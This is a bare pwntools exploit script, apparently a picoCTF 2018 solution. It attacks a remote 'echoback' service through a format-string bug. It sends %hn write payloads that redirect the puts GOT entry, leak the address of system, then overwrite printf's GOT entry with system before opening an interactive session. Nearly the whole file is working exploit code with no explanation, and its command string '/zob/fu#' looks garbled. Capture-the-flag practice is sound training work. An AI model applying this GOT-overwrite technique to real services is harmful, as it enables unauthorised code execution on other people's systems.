from pwn import *


GOT_PUTS = 0x804a01c
GOT_PRINTF = 0x804a010
GOT_SYSTEM = 0x804a020
VULN = 0x080485ab

p = remote('2018shell1.picoctf.com', 22462)
# p = process('./echoback')

# gdb.attach(p, """
# b *0x08048609
# c
# """)

# offset 43
# offset 7: input
# gdb.attach(p, 'b *0x080485e1\nc')

first = VULN >> 16
second = VULN & 0x0000ffff
print(hex(first))
print(hex(second))
info('puts: {}'.format(GOT_PUTS))
p.sendline(p32(GOT_PUTS)+p32(GOT_PUTS+2)+p32(GOT_SYSTEM)+'%0{}x%8$hn%0{}x%7$hn::%9$s'.format(first - 12, second - first))
p.readuntil('::')
system = u32(p.readline()[:4])
print(hex(system))
second = system >> 16
first = system & 0x0000ffff
print(hex(first))
print(hex(second))
p.sendline('/zob/fu#' + p32(GOT_PRINTF)+p32(GOT_PRINTF+2)+'%0{}x%9$hn%0{}x%10$hn'.format(first - 16, second - first))


p.interactive()
